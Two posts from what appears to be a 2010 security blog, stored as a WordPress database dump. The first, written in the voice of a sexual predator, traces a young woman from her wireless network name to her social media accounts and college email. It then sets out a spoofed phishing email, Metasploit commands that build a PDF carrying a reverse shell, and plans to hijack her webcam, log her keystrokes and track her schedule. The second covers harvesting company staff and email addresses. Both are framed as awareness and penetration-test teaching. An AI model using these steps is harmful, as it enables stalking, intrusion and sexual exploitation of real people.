'257','14','open','http://www.attackvector.org/?p=257','0','open','','2','As promised, I\'m posting about another method to obtain private information about people and their personal lives.  This one has darker implications, though, so I\'m not going to be posting the real names of the people that I find, nor will I post private information.  The people listed here simply made a mistake by not putting security in the forefront of their mind, but nothing else.  I believe that they need to be educated, but not exposed and opened to possible crime.\n\nI\'m using this post as a way to open peoples eyes about the seriousness of overlooking little things that could, in the right hands and a twisted mind, be used in deviant ways.\n\nI really want women to pay attention to this one, as that\'s who I\'m going to be focusing on in this post because I believe the crimes that could result directly affect them.  In this post, I am going to be using the mindset of a sexual predator/pervert.  I\'m a regular guy, so it\'s pretty easy for me to get into the role of a pervert... ;-P\n\nAnyway, without further adeu, I\'ll begin.\n<!--more-->\nI\'m going to talk about information gathering through wireless networks.  I\'m not talking about cracking WEP keys and stealing cookies (although, I will probably be touching on it).  This is about what people are using as their SSID\'s.  Lets take a look.\n\nHere\'s a Kismet log that I created on one of my recent excursions that I\'ve run through a simple regular expression to suck out the good bits..\n\n<blockquote>\ncat some.kismet.log.network|grep Network|perl -le \'while(<STDIN>){ if(/no ssid/) { next; }if(/^Network.*?\"([A-Z].*?s+.*?Network)\"s+B.*/) { print \"$1\"; }}\'|more\n\nTim Thomas\'s Network\nMark Johnson\'s Network\nMark Smith Network\nDon Jones\'s Network\nTia Target\'s Network\n..snip..\n</blockquote>\n\n(Again, the names have been changed..)\n\nSo, now we have a (huge) list of names to play with.  We also know roughly where they live (802.11 only travels for so far).. pin pointing it wouldn\'t be difficult.\n\nWe go through the list of names one by one, simply entering them in to Google to see what pops up.  We\'re mostly interested in an easy target and only women, because, as a pervert, I\'m not interested in the guys.\n\nI finally get to \"Tia Target\" and bam, lots of information.  And pictures.\n\n<center><table border=0><tr><td><img src=\"http://www.attackvector.org/files/tia.jpg\"></td><td><img src=\"http://www.attackvector.org/files/tia2.jpg\"></td></tr></table></center>\n(yes, that\'s really her.)\n\nThrough her Myspace page, we find out that she\'s 23, last logged in on May 23rd, so she\'s actively using Myspace.  Also, her interests are traveling, music (Bob Dylan, specifically), and hanging out with friends.  She\'s single, straight, born in Kansas (changed), she\'s 5\'4\", a Virgo, and she drinks.  Based on her pictures, it looks like she models, or has done some modeling.  At this point, I could easily become her soul mate, but my plans are a bit more sinister.  Also, based on a lot of her profile pictures, it would appear that she\'s using a computer with a web cam.  Score!\n\nFirst, she goes to college, but doesn\'t say which one.  However, she has friends.  And, if her page itself doesn\'t tell me which college she goes to, I\'m sure one of her friends will.\n\nSure enough, going through her \"top friends\" list, through one of her friends I find out that she goes to Hesston (changed).\n\nGoogle has also indicated that she has a Facebook page.  But nothing is on that that isn\'t on her Myspace page, plus she\'s done a semi decent job and setting it to private.\n\nAlso, through Google, I find out that she was definitely was a model and placed as 1st runner up in a beauty pageant in 2004.  \n\nAgain, because of my end goal, I\'m not too interested in that.  What I need are an address, phone number, and email address.  First, I\'m going to focus on email, because the other two become irrelevant if I have her email.\n\nUnfortunately, simple Google searches are not going to be enough in this case.  Maltego failed as well.  She apparently doesn\'t do much with forums, blogs, etc.. so I\'m going to have to get crafty.\n\nIt\'s unlikely that I\'m going to find her personal email address at this point, so I\'m going to resort to using her college address.  Who knows, maybe she uses that as her personal email...\n\nFirst, I need to figure out what format the admins at Hesston use when setting up a new user on their systems (I wrote a program that investigates this for me that I explained in a previous post.  It\'s called \"Harvest\".).\n\n<blockquote>\n# ./harvest.pl hesston.edu\nGoogle results...\ntims@hesston.edu found 2 times\ndustin@hesston.edu found 1 times\ndanh@hesston.edu found 1 times\nrussg@hesston.edu found 1 times\nbobh@hesston.edu found 2 times\nkristam@hesston.edu found 1 times\naviation@hesston.edu found 1 times\n..snip..\n</blockquote>\n\nOk, so it would appear that the school uses firstname and last initial, with no separator.  We can conclude from this, then, that her email address would be tiat@hesston.edu. (remember - her name isn\'t \"tia\", her last name isn\'t \"target\", so there is no \'tiat@hesston.edu\'..).  Lets check.\n\n<blockquote>\n$ nslookup -type=MX hesston.edu\n\nhesston.edu	mail exchanger = 8 mailgateway2.hesston.edu.\nhesston.edu	mail exchanger = 10 mailgateway3.hesston.edu.\nhesston.edu	mail exchanger = 5 mailgateway.hesston.edu.\n</blockquote>\n\nThose are the mail servers.. connect to the one with the lowest MX.\n\n<blockquote>\n$ telnet mailgateway2.hesston.edu 25\nTrying 198.248.203.5...\nConnected to mailgateway2.hesston.edu.\nEscape character is \'^]\'.\n220 mailgateway2.hesston.edu ESMTP Exim 4.66 Mon, 24 May 2010 13:48:12 -0500\nhelo xyz.com\n250 mailgateway2.hesston.edu Hello mail.xyz.com [1.2.3.4]\nmail from:matt@attackvector.org\n250 OK\nrcpt to: tiat@hesston.edu\n250 2.1.5 tiat@hesston.edu... Recipient ok\n</blockquote>\n\nBingo.. we have an email address.\n\nSo, the first plan of attack is going to be a remote one.  Why be the creepy dude sitting in front of someones house when you don\'t have to be?  I know she loves Bob Dylan, and I have a list of her friends, who also indicate that they go to Hesston college.. so I\'ll just send an email from one of her friends (spoof), to her, with a backdoored PDF.\n\n<blockquote>\nFrom: Kelly Mark <kellym@hesston.edu>\nTo: Tia Target <tiat@hesston.edu>\nSubject: You have to check this out!!\nAttachment: Bob Dylan Trivia.pdf\n\nHey Tia.. check this out!\n</blockquote>\n\nHere\'s how I would create the PDF..\n\n<blockquote>\nmsf exploit(adobe_utilprintf) > use windows/fileformat/adobe_utilprintf\nmsf exploit(adobe_utilprintf) > set payload windows/shell/reverse_tcp\npayload => windows/shell/reverse_tcp\nmsf exploit(adobe_utilprintf) > set filename \"Bob Dylan Trivia.pdf\"\nfilename => Bob Dylan Trivia.pdf\nmsf exploit(adobe_utilprintf) > set outputpath /tmp\noutputpath => /tmp\nmsf exploit(adobe_utilprintf) > set EXITFUNC seh\nEXITFUNC => seh\nmsf exploit(adobe_utilprintf) > set lhost 1.2.3.4\nlhost => 1.2.3.4\nmsf exploit(adobe_utilprintf) > exploit\n\n[-] Handler failed to bind to 1.2.3.4:4444\n[*] Started reverse handler on 0.0.0.0:4444 \n[*] Creating \'Bob Dylan Trivia.pdf\' file...\n[*] Generated output file /tmp/Bob Dylan Trivia.pdf\n[*] Exploit completed, but no session was created.\n</blockquote>\n\nNow, when this PDF is opened, it will connect back to me and I\'ll have remote access to her machine.  Once it does connect back to me, I\'ll install a RAT (Remote Administration Tool), or VNC dll, which will give me total control over her computer.  Including the ability to turn on her webcam and listen to her microphone.  With any luck, her computer will be in her bedroom.\n\nLike I said, with her email address, I wont have to have her phone number and home address because if the exploit works as intended, I\'ll easily be able to collect that information directly from her computer (web history, cache, Windows registration files, registry entries, etc).  That said, I did some digging and found a post that she left on one of her friends walls on Facebook asking her friend to call her, giving up her cell phone number.\n\nAlternatively, if the exploit didn\'t work, I\'d have to go play the creepy guy sitting in his car in front of her house/apartment/whatever.  I\'d just have to get close enough to her place to get a solid signal.  From there, finding a way in to her computer would be trivial doing simple WEP cracking, then running some exploit against her machine.  If, by some miracle, nothing works.. I\'ll just resort to sniffing her data by poisoning her arp cache.\n\nInitially, my goal would be to control the webcam and mic.  This would allow me to monitor her pretty closely.  Additionally, because I\'d be seeing everything she typed on her computer via either remotely watching her desktop, or via an injected keylogger, I\'ll know her schedule.  When she\'s in, out, where she\'s going, when she\'s planning on people coming over, parties, etc.  I\'d be like, Stalker version 2.0.\n\nObviously, a young woman *probably* wouldn\'t want a sexual predator/pervert having this information. I don\'t think I have to go further than that in explaining why not.\n\nSo, in the best case scenario for her, I\'m just a pervert and want to watch her web cam and hopefully see her naked.  In the worst case scenario....\n\nWhere did she go wrong?\n\n1)  NEVER, under ANY CIRCUMSTANCES should you ever name your wireless network with anything identifiable.  Name it something obscure and mix it up.  If it\'s a Linksys router, name it Netgear.. if it\'s Netgear, name it Linksys, etc.  Never use your name, your address (there are plenty of people in this list who used their house number and street name as their SSID.. wtf??)  Also, there is something to be said about security through obscurity.  If I\'m driving around and I see a SSID named \"SUPER SECURE NETWORK, JUST TRY ME\" amongst 300 SSID\'s named \"Netgear\" and \"Linksys\".. guess which network I\'m most likely to hit?  There\'s a network near me named \"Suzie\'s Sex Service\".  Guarantee I\'ll be passed over when that SSID pops up.  Additionally, turning OFF SSID broadcasting is another level of protection.  No, it\'s not going to protect you against someone searching specifically for you, but to take care of your average war driver, this will accomplish it.\n\n2) It\'s impossible to expect people to give up social networking sites.. so, limit your exposure by NOT filling out your entire profile.  The people you\'re adding as friends probably already know you pretty well, thus they do not need to know where you go to school, your cell phone number, address, etc etc etc.  It\'s just not a good idea.\n\n3) NEVER post your phone number on anyone\'s profile on any social networking site.  Her Facebook profile was set to private, so there wasn\'t much information to be obtained.  However, a lot of her friends were wide open.  Because of them, I obtained her information because of a mistake on her part.\n\n4) Don\'t leave your web cam plugged in.  It takes two seconds to unplug it from your computer.. do it.  There is a lot of malware out there that allows access to web cams, too.\n\n5) Do NOT just allow anyone to befriend you on social sites.  Yes, the idea is to be social.. but, given how many friends it says she has on Facebook, if I wanted to obtain the information that she\'s set to private, I could easily just send her a friend request.  If you don\'t know the person who\'s trying to befriend you, don\'t add them.  Period.\n\nBe smart, people.. assume that if you post it on the internet, it\'s going to be picked up by Google.. which means someone is going to be able to find it.','','2010-05-24 16:46:51','2010-05-24 21:46:51','','','2010-05-24 16:46:51','2010-05-24 21:46:51','invasion-of-privacy-the-sequel','0','','publish','Invasion of Privacy.  The Sequel. ','post',''),(
'265','4','open','http://www.attackvector.org/?p=265','0','open','','2','I talk a lot about finding information about individuals.. but this post is going to focus on finding information about companies, who works there, email addresses, and any other information I can harvest.\n\nIt will also talk about how a company can protect itself from some of these \"vulnerabilities\"..\n\nWe\'re going to build a profile of a company using simple tools.  By the end, we\'ll have addresses, employee names, email addresses, and the network layout.  This information is useful during a penetration test to determine trust relationships, as well as attack vectors (ha!).  Best of all, the reconisence work that we\'ll be doing will be, for the most part, undetectable, because we\'re not going to be slamming them with port scans, grabbing banners, etc.  That would be the next step in the process, after the initial information has been gathered.\n<!--more-->\nBecause the information I\'ll be posting could be used to totally own this company, I\'m going to protect their information, because what they lack in the security department, they make up for in lawyers.  So!\n\nWe\'ll call this company XYZ Corp, Inc.\n\nFirst, lets start with some basic info.  \'<a href=\"http://www.whois.sc\">whois</a>\' is probably the best starting off point and how I begin all of my pen tests.\n\n<blockquote>\nRegistrant:\nxyz.com\n   6455 Some Rd\n   Dallas, TX 12345\n   US\n\n   Domain Name: XYZ.COM\n\n   Administrative Contact:\n      Jones, Mike                helpdesk@xyz.com\n      XYZ Corporation\n      6455 Some Rd\n      Dallas, TX 12345\n      US\n      111-555-1234 fax: 111-555-1235\n\n   Record expires on 23-Mar-2019.\n   Record created on 22-Mar-1996.\n\n   Domain servers in listed order:\n\n   NS.XYZ.INFO              1.2.3.4\n   NS2.XYZ.INFO             1.2.3.5\n</blockquote>\n\nSo, we now know the address, the administrative contact, an email address, some phone numbers, and the NS servers for the domain.  That\'s more than enough information to get started.  :-)\n\nFirst, I want to start with finding employees.  I actually modified my \"Harvest\" program to do a better job at collecting info.  There are other programs out there that collect data like this.. but, I haven\'t seen one as accurate and thorough as mine, so.. until something better comes along, this is what I use..\n\n<blockquote>\n# harvest.pl xyz.com\nYahoo results...\nmary_rXX@xyz.com found 1 times\ninfo@xyz.com found 38 times\nken_bXX@xyz.com found 1 times\ntim_hXX@xyz.com found 1 times\n\nGoogle results...\nmary_rXX@xyz.com found 3 times\nemailinfo@xyz.com found 1 times\ninfo@xyz.com found 15 times\nShawn_KXX@xyz.com found 1 times\nken_bXX@xyz.com found 1 times\ngovernment@xyz.com found 1 times\nphilsXX@xyz.com found 1 times\njames_lXX@xyz.com found 1 times\ntodd_fXX@xyz.com found 1 times\ntim_hXX@xyz.com found 1 times\n\nAltaVista results...\nmary_rXX@xyz.com found 1 times\nemailinfo@xyz.com found 0 times\ninfo@xyz.com found 11 times\nShawn_KXX@xyz.com found 0 times\nken_bXX@xyz.com found 0 times\ngovernment@xyz.com found 0 times\nphilsXX@xyz.com found 0 times\njames_lXX@xyz.com found 0 times\ntodd_fXX@xyz.com found 0 times\ntim_hXX@xyz.com found 0 times\n\nLinkedIn Title Search\nStacy MXX - In 2000 I accepted an offer from XYZ to move to Northern California. After six months in the bay area, XYZ moved me to\nBill HXX - Dallas, Texas Area - Director of Firmware Development at LSI Seagate / XYZ. (Public Company; 501-1000 employees; stx;\nHeather RXX - Greater Dallas - Experience Marketing Programs Specialist and Event Coordinator/Planner\nRob SXX - Greater Salt Lake City Area - IS&T Service Manager at Intermountain Healthcare\nDennis PXX - Created a Professional Services organization for XYZ ... Developed relationships with XYZ Solution partner across the\nScott FXX - Greater Dallas area - Senior Principal Software Engineer at XYZ\nTony SXX - Colorado Springs, Colorado Area - Director of Firmware Engineering at XYZ\nKarl SXX - Greater Dallas - Consulting CTO / Consulting CIO From March 2006 through January 2007 added Daticon General Manager\nPeter MXX - As a Sr. Systems Engineer for XYZ, I partnered with Account Executives to develop an enterprise account base and met assigned\nPaul UXX - Providence, Rhode Island Area - Windows Server Application Support Team Leader at FM Global\nKenneth KXX - Greater Dallas Area - Technology Executive, UX Design Lead\nDean BXX - Member of XYZ Service mgmt team responsible for high-level decisions and planning pertaining to XYZ Service ops. *\n</blockquote>\n\nNow, I\'ll go through the list of email addresses and the list of names in the title search and see if I can associate any of them.  This is handy because you\'ll have an email address, plus an idea as to where an email to that person may wind up within the company and what power that person may have and what they may have access to.  Also, if you\'re planning a social engineering attack, don\'t call up and pretend to be someone who\'s no longer employed at the company.  This will set off red flags all over the place.\n\nOne of the easiest ways to verify the information before hand is to connect to their mail server and verify the email address using RCPT to ensure that the email is still active.  Companies today are so paranoid about espionage and corporate fraud, that employees email addresses are suspended prior to the employee being terminated, so if you connect and do an RCPT and the mail server responds with \"Ok\", chances are good that that person still works there.\n\nNext, I would like some information about the software they use and attempt to find more employees.  The easiest way to do this is simple meta data extraction.  There\'s a program called \"metagoofil\", but I find that it doesn\'t work very often because Google has issues with automated search queries.. so.  Also, it\'s hard to be terribly stealthy an admin happens to go through the logs and see your IP address downloading every single one of their Word documents within the span of a few seconds.  Remember, the idea is to blend in with your surroundings.  In this case, web traffic.  \n\nAside from using \"metagoofil\", a simple Google query will work just fine..\n\n<blockquote>\nsite:xyz.com doc\n</blockquote>\n\n<blockquote>\n$ wget https://www.xyz.com/documents/Coversheet.doc\n\n$ extract Coversheet.doc\nKeywords from Coversheet.doc:\nmimetype - application/msword\nlanguage - U.S. English\nparagraph count - 8\nline count - 30\nword count - 640\npage count - 1\ncreator - Kathy\ndate - 2010-04-13T19:34:00Z\ncharacter count - 3649\ngenerator - Microsoft Word 10.0\nlast saved by - Mary\ncreation date - 2010-04-13T19:25:00Z\ntemplate - Normal.dot\n</blockquote>\n\nOk, not too incredibly interesting.. but at least we know that they\'re using Microsoft Office 2003 and not 2007 and we can be relatively certain that they haven\'t upgraded because of the fact that this document wasn\'t created that long ago.  We also see a Mary and a Kathy.  I remember seeing a \"mary_rXX@xyz.com\" earlier.  Unfortunately, \"Mary\" is a rather common name, so it\'s hard to say whether or not they\'re the same people.  People need to start getting more creative when they name their kids!\n\nAnyway, so we\'ve pretty well uncovered their employee base.  I\'m sure that spending a few more hours digging through all of the employees personal lives would probably reveal company information, but I\'ll leave that to you.\n\nIn <a href=\"http://www.attackvector.org/?p=267\">part 2</a> of this post, I\'ll be focusing on the network side of things.','','2010-05-25 11:29:25','2010-05-25 16:29:25','','','2010-05-25 11:29:25','2010-05-25 16:29:25','corporate-information-discovery-part-1','0','','publish','Corporate Information Discovery [Part 1]','post','');
